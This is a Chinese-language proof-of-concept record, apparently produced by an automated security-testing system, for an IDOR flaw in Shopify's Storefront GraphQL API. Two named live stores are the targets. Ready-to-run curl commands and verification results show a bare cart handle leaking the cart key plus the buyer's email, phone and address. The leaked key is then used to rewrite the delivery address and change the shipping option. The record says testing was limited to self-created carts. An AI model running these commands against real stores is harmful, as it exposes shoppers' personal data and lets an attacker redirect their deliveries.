# Shopify Storefront cartPrepareForCompletion 裸 handle 泄露买家 PII 并用泄露 key 改写收货地址/配送（thegamecollection 两店复核成立）

- **code**: shopify-cartprepareforcompletion-bare-handle-pii-write-tgc
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify Storefront GraphQL（cartPrepareForCompletion / cartDeliveryAddressesUpdate / cartSelectedDeliveryOptionsUpdate）
- **severity**: high
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 UTC，ARTEX 执行机 curl（全新无 Cookie）：www 店裸 handle cartPrepareForCompletion(cartId="gid://shopify/Cart/hWNJ20g1P6nyzMBQHaNgSqSG") → HTTP 200 CartStatusReady，cart.id 回显"?key=8c399548fdaddee681575a3abdbafe6f"、email=verifier-i1784@example.com、phone=+447911123456、地址 Verifier/12 Test Lane/London/SW1A 1AA；错误 key 响应逐字相同、随机 handle→result:null；用泄露 key cartDeliveryAddressesUpdate → userErrors=[]（地址改为 PWNED/666 Redirect Lane/Manchester/M1 1AA）。collect 店裸 handle hWNJ20vmUkjqXQZyUNzU6CCW → 回显 ?key=b2667aca207580fdc42afc6db328aee8 与同组 PII；泄露 key cartSelectedDeliveryOptionsUpdate 把 Royal Mail Tracked 48 切到 Tracked 24 → userErrors=[] 并持久化。原始响应落盘 /opt/artex/data/tasks/7/i1784/。finding#84/task#7。
- **path**: pocs/shopify-cartprepareforcompletion-bare-handle-pii-write-tgc/poc.sh
- **tags**: shopify,storefront,graphql,cart,idor,unauthorized,pii,prepare-for-completion,delivery-address
- **created_at**: 2026-11-11T17:33:17.429Z
- **engine**: https://www.thegamecollection.net; https://collect.thegamecollection.net

## 用法

```
# 0) （受害者侧基线）自建车并写入 email/phone/地址（持正确 key）
curl -sk -c a.txt -X POST 'https://<shop>/cart/add.js' -H 'Content-Type: application/json' --data '{"items":[{"id":"<variant_id>","quantity":1}]}'
curl -sk -b a.txt 'https://<shop>/cart.js'   # token=<handle>?key=<REAL_KEY>

# 1) 全新无 Cookie：裸 handle 一次拿真实 key + email/phone + 全量收货地址
curl -sk -X POST 'https://<shop>/api/graphql' -H 'Content-Type: application/json' --data '{"query":"mutation P($cartId:ID!){cartPrepareForCompletion(cartId:$cartId){result{__typename ... on CartStatusReady{cart{id buyerIdentity{email phone} delivery{addresses{id selected address{... on CartDeliveryAddress{firstName lastName address1 address2 city company provinceCode zip countryCode phone}}}} deliveryGroups(first:10){nodes{id deliveryOptions{handle title} selectedDeliveryOption{handle title}}}}}}}","variables":{"cartId":"gid://shopify/Cart/<HANDLE>"}}'
# 错 key 同值、随机 handle → result:null

# 2) 用泄露 key 写车（仍无 Cookie）
#    cartDeliveryAddressesUpdate(addresses:[{id:<CartSelectableAddress id>, address:{deliveryAddress:{...}}, selected:true}])
#    cartSelectedDeliveryOptionsUpdate(selectedDeliveryOptions:[{deliveryGroupId:"gid://shopify/CartDeliveryGroup/<id>?cart=<HANDLE>", deliveryOptionHandle:"<handle>"}])
#    判据:userErrors=[] 且再裸 handle 读回可见变更

# 注意：不要调 cartSubmitForCompletion，不要完成真实支付；仅自建车验证。
```

## 正文

```
# 复核结论（两店同型，2026-11-11 UTC）
对 The Game Collection 的 www（The Game Collection）与 collect（TGC Collectables，独立 shop）两个 Shopify 店，KB#606/#590 的打法逐项成立：

- `POST /api/graphql` 的 `cartPrepareForCompletion(cartId:"gid://shopify/Cart/<25位handle>")` **不校验 ?key、不需要 Cookie**；返回 `CartStatusReady` 且 `cart.id` 回显真实 `?key=<32hex>`，同时回显 `buyerIdentity.email/phone` 与 `delivery.addresses{selected,address{firstName,lastName,address1,address2,city,company,provinceCode,zip,countryCode,phone}}`、`deliveryGroups{deliveryOptions{handle,title},selectedDeliveryOption}`。
- 三态对照：正确 key ≡ 裸 handle ≡ 错误 key（逐字相同）；随机 handle → `result:null`。
- 用泄露 key（仍在无 Cookie 会话）：
  - `cartDeliveryAddressesUpdate(cartId:"gid://.../<handle>?key=<LEAK>", addresses:[{id:<CartSelectableAddress id>, address:{deliveryAddress:{...}}, selected:true}])` → `userErrors:[]`，地址改写持久化；
  - `cartSelectedDeliveryOptionsUpdate(cartId:"...?key=<LEAK>", selectedDeliveryOptions:[{deliveryGroupId:"gid://shopify/CartDeliveryGroup/<id>?cart=<handle>", deliveryOptionHandle:"<handle>"}])` → `userErrors:[]`，配送切换持久化（collect 店 3 档：Tracked 48 / Tracked 24 / Courier Next Day，48→24 可观测）。

# 两店差异
- www 仅 1 个 Standard 配送选项（写调用成功但无可观测切换）；collect 有 3 个选项可观测改选。
- 两家 `/api/graphql` 未版本化路径行为一致。

# 判据与门槛
handle 为 108bit 随机不可枚举；攻击前提是 handle 经分享购物车链接 / Referer / 页面 `ShopifyAnalytics.meta.cart.id` 等渠道泄漏。未调 `cartSubmitForCompletion`、未下单。
```
